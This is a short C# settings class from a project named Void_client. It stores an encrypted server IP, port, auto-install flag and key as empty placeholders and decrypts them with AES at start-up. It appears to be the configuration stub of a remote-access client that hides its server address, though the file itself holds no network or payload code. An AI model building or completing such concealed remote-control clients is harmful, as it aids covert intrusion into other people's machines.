using Void_client.Libs;

namespace Void_client
{
    class Settings
    {
        public static bool Initialize()
        {
            if (string.IsNullOrEmpty(KEY))
                return false;
            //decrypts all the information
            AES.SetDefaultKey(KEY);
            SERIP = AES.Decrypt(SERIP);
            PORT = AES.Decrypt(PORT);
            ISAUTOINSTALL = AES.Decrypt(ISAUTOINSTALL);
            return true;
        }

        public static string SERIP = "";

        public static string PORT = "";

        public static string ISAUTOINSTALL = "";

        public static string KEY = "";
    }
}